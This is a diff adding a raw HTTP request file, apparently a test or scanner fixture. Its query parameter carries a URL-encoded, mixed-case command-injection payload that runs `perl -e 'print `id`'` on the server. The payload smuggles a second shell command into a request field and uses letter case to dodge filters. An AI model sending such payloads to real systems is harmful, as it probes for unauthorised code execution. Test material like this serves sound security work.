@@ -1,0 +1,4 @@
+GET /a?url=;%20pErL%20-e%20'PrInT%20`iD`' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
